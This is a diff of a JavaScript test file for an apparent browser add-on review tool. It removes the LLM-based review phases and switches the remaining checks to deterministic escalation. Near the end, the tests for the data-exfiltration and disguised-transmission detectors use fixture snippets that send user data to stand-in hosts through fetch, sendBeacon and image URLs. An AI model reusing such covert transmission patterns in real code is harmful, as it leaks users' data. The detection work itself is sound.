@@ -2670,7 +2427,7 @@ test("usedPermissions tracks reachable requirements, not dead-file ones", () => 
   );
 });
 
-// The no-LLM checklist drops a declared permission a reachable call provably
+// The checklist drops a declared permission a reachable call provably
 // needs (messages.get -> messagesRead), escalating only the unproven ones.
 test("unused-permission omits permissions a reachable call requires", () => {
   const manifest = {
@@ -3089,7 +2846,7 @@ test("missing-library / obfuscated-code note a verdict per classified file", () 
 // These checks decide one thing about the manifest/submission; each reports its
 // outcome to the feed - pass/fail, or skipped-with-reason when it does not apply
 // (so a bare check header is never ambiguous). unsure = the deterministic
-// decision to escalate, never the LLM's answer.
+// decision to escalate, never an answer to it.
 test("experiment-not-allowed notes pass / fail / skipped", () => {
   const ctxFor = (manifest, allowExperiments) => ({
     addon: {
@@ -3262,7 +3019,7 @@ test("missing-english-localization: franc over hardcoded text", () => {
 });
 
 // ---- yaml-driven loader ----
-// Every registry entry across the deterministic and llm sections loads to a
+// Every registry entry in the deterministic section loads to a
 // module with a run() function plus id/title, and ids stay in sync with checkIds.
 test("every check entry (both sections) resolves to a runnable module", async () => {
   const registry = loadRegistry();
@@ -3275,7 +3032,7 @@ test("every check entry (both sections) resolves to a runnable module", async ()
     assert.equal(typeof c.run, "function");
     assert.ok(c.title && c.id);
   }
-  // The loader spans deterministic + llm checks now.
+  // The loader spans every deterministic check.
   assert.ok(ids.includes("unknown-api"));
   assert.ok(ids.includes("unused-files"));
 });
@@ -3295,38 +3052,11 @@ test("loadChecks throws hard when a check: names a missing module", async () => 
   }
 });
 
-// A post-summary-recheck producer must name a real consumer that carries a
-// summary-prompt; otherwise its diverted items would be silently dropped, so the
-// loader rejects the registry.
-test("loadChecks rejects a dangling or prompt-less post-summary-recheck target", async () => {
-  const tmp = path.join(os.tmpdir(), `recheck-registry-${process.pid}.yaml`);
-  const write = (body) => fs.writeFileSync(tmp, body);
-  try {
-    // Target names no check at all.
-    write(
-      "deterministic-phase:\n- title: P\n  check: producer-x\n  post-summary-recheck: nope\n"
-    );
-    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /is not a check/);
-    // Target is a real check, but it carries no summary-prompt.
-    write(
-      "deterministic-phase:\n" +
-        "- title: P\n  check: producer-x\n  post-summary-recheck: consumer-x\n" +
-        "- title: C\n  check: consumer-x\n"
-    );
-    await assert.rejects(() => loadChecks(loadRegistry(tmp)), /summary-prompt/);
-  } finally {
-    fs.rmSync(tmp);
-  }
-});
-
-// A check's phase IS the section it came from - never declared per entry. The recheck
-// consumer lives in post-summary-phase; its producer (which declares a
-// post-summary-recheck but carries no rubric) stays in the deterministic phase; and the
-// reject check lives in the invalid-experiment phase.
+// A check's phase IS the section it came from - never declared per entry. The reject
+// check lives in the invalid-experiment phase, everything else in the deterministic one.
 test("a check's phase is the section it came from", async () => {
   const byPhase = await loadChecks(loadRegistry());
   const idsIn = (phase) => byPhase.get(phase).map((c) => c.id);
-  assert.ok(idsIn("post-summary").includes("unused-permission-recheck"));
   assert.ok(idsIn("deterministic").includes("unused-permission"));
   assert.ok(idsIn("invalid-experiment").includes("experiment-not-allowed"));
   // ...and the reject check is in NO other phase - it only runs when short-circuiting.
@@ -3343,7 +3073,7 @@ test("loadRegistry rejects a check declared in two phases", () => {
     tmp,
     "deterministic-phase:\n" +
       "- title: Sync XHR\n  severity: warning\n  check: sync-xhr\n  input: source\n" +
-      "llm-phase:\n" +
+      "invalid-experiment-phase:\n" +
       "- title: Sync XHR again\n  severity: info\n  check: sync-xhr\n  input: source\n"
   );
   try {
@@ -3358,17 +3088,12 @@ test("loadRegistry rejects a check declared in two phases", () => {
 
 // The phase sections ARE the control flow: runChecks looks each one up BY NAME. So renaming
 // or misspelling one in registry.yaml would not fail loudly - it would yield an empty phase,
-// and the review would silently run without every llm check, or without every recheck
-// consumer. loadRegistry asserts the shipped registry declares all four; this pins that no
-// phase can quietly become empty (a typo makes loadRegistry throw, and this test fail).
+// and the review would silently run without every check in it. loadRegistry asserts the
+// shipped registry declares them all; this pins that no phase can quietly become empty (a
+// typo makes loadRegistry throw, and this test fail).
 test("every phase of the shipped registry is declared and populated", async () => {
   const byPhase = await loadChecks(loadRegistry());
-  for (const phase of [
-    "invalid-experiment",
-    "deterministic",
-    "llm",
-    "post-summary",
-  ]) {
+  for (const phase of ["invalid-experiment", "deterministic"]) {
     assert.ok(
       (byPhase.get(phase) ?? []).length > 0,
       `phase "${phase}" loaded no checks - its registry.yaml section is missing or renamed`
@@ -3384,16 +3109,14 @@ test("assertRequiredPhaseSections rejects a missing or empty required phase sect
   const full = {
     "invalid-experiment-phase": [{ check: "experiment-not-allowed" }],
     "deterministic-phase": [{ check: "sync-xhr" }],
-    "llm-phase": [{ check: "data-exfiltration" }],
-    "post-summary-phase": [{ check: "unused-files-recheck" }],
   };
   // The complete set is accepted.
   assert.doesNotThrow(() => assertRequiredPhaseSections(full, "ok.yaml"));
   // A section removed entirely (a rename) throws, naming the missing one.
-  const { "llm-phase": _dropped, ...missing } = full;
+  const { "invalid-experiment-phase": _dropped, ...missing } = full;
   assert.throws(
     () => assertRequiredPhaseSections(missing, "x.yaml"),
-    /phase section "llm-phase" is missing or empty/
+    /phase section "invalid-experiment-phase" is missing or empty/
   );
   // A section present but empty throws too.
   assert.throws(
@@ -3498,37 +3221,6 @@ test("loadChecks rejects an invalid severity token", async () => {
   }
 });
 
-// ---- the two deferral lanes ----
-// A check may defer in two ways in one run: `llm` for what it could not settle, and
-// `escalations` for what it settled but may not decide. They are independent, so both
-// results must come back - the shape that would silently drop the escalations is the
-// branch running only the first lane.
-test("a check that defers both ways gets both lanes run", async () => {
-  const check = {
-    id: "both",
-    severity: "warning",
-    run: () => ({
-      findings: [],
-      llm: {
-        candidates: [{ id: "U1", file: "a.js" }],
-        // No token in this ctx, so every candidate comes back unsure; what matters
-        // here is that resolve ran at all.
-        resolve: () => ({ findings: [], manual: [{ item: "unsettled" }] }),
-      },
-      escalations: [{ item: "undecided", llmNotNeeded: true }],
-    }),
-  };
-  const out = await runOneCheck({}, check, "[1/1]");
-  assert.deepEqual(
-    out.manualItems.map((m) => m.item),
-    ["unsettled", "undecided"]
-  );
-  assert.deepEqual(
-    out.manualItems.map((m) => m.llmNotNeeded),
-    [false, true]
-  );
-});
-
 // ---- severity stamping (the orchestrator is the gatekeeper) ----
 // A check under a FIXED registry severity cannot choose its own: any f.severity
 // it sets is overwritten with the entry's. Only severity:auto delegates the
@@ -3618,11 +3310,9 @@ test("disguised-* hard-flag the STRONG covert case (a user-data API in the URL)"
   assert.equal(res('img.src = "https://x/logo.png";'), 0); // static, no data
 });
 
-test("disguised-transmission takes the WEAK covert case as an LLM candidate", () => {
-  const cands = (code) => {
-    const out = disguisedTransmission.run(withManifest(jsCtx(code)));
-    return out.llm ? out.llm.candidates.length : 0;
-  };
+test("disguised-transmission escalates the WEAK covert case", () => {
+  const cands = (code) =>
+    disguisedTransmission.run(withManifest(jsCtx(code))).escalations.length;
   assert.equal(cands('img.src = "https://x/?d=" + body;'), 1); // appended-only
   assert.equal(
     cands('window.location.href = "https://x/" + team + "/inbox";'),
@@ -3637,30 +3327,25 @@ test("disguised-transmission takes the WEAK covert case as an LLM candidate", ()
   assert.equal(cands('fetch("https://x/?d=" + body);'), 0); // overt, not covert
 });
 
-test("data-exfiltration makes a candidate per overt remote transmission only", () => {
-  const candidates = (code) => {
-    const out = dataExfiltration.run(withManifest(jsCtx(code)));
-    return out.llm ? out.llm.candidates.length : 0;
-  };
+test("data-exfiltration escalates an overt remote transmission only", () => {
+  const candidates = (code) =>
+    dataExfiltration.run(withManifest(jsCtx(code))).escalations.length;
   assert.equal(candidates('fetch("https://api.example.com/", { body });'), 1);
   assert.equal(candidates('navigator.sendBeacon("https://x", d);'), 1);
   assert.equal(candidates('fetch("./local.json");'), 0); // local
   assert.equal(candidates('img.src = "https://x/?d=" + body;'), 0); // covert
 });
 
-// The transmission method and the destination AS WRITTEN ride on the finding's
+// The transmission method and the destination AS WRITTEN ride on the escalation's
 // `hint` (shown on the locus), so the reviewer sees where the data goes without
-// opening the file, while `item` stays absent so the recheck key stays the unique
-// file:line. A send with no destination to name keeps the method alone.
+// opening the file, while `item` stays absent so every site groups under the one
+// manual entry. A send with no destination to name keeps the method alone.
 test("data-exfiltration labels each locus with the method and destination", () => {
   const hintOf = (code) => {
-    const out = dataExfiltration.run(withManifest(jsCtx(code)));
-    const { findings } = out.llm.resolve(
-      new Map([["X1", { verdict: VERDICT.FAIL }]])
-    );
-    assert.equal(findings.length, 1);
-    assert.equal(findings[0].item, null);
-    return findings[0].hint;
+    const { escalations } = dataExfiltration.run(withManifest(jsCtx(code)));
+    assert.equal(escalations.length, 1);
+    assert.equal(escalations[0].item, undefined);
+    return escalations[0].hint;
   };
   assert.equal(
     hintOf('fetch("https://api.example.com/", { body });'),
